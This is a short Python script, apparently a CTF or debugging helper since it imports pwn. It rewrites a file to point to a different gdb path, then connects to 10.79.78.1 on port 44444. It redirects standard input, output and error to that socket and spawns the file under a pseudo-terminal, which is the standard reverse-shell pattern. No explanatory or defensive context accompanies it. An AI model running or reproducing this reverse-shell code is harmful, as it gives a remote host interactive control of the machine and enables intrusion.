#! /bin/env python3
import sys,subprocess,socket,os,pty,pwn
#print(f"{sys.argv}")
with open(sys.argv[1],"r") as f:
    data=f.readlines()
#data=data[0:3] + ['-p'] + data[3:]
with open(sys.argv[1],"w") as f:
    f.writelines([d.replace("/usr/bin/gdb","/opt/gdb-11.2/bin/gdb") for d in data])
s=socket.socket()
s.connect(("10.79.78.1",44444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
#p=subprocess.call(["/bin/sh", "-c", sys.argv[1]])
pty.spawn(sys.argv[1])
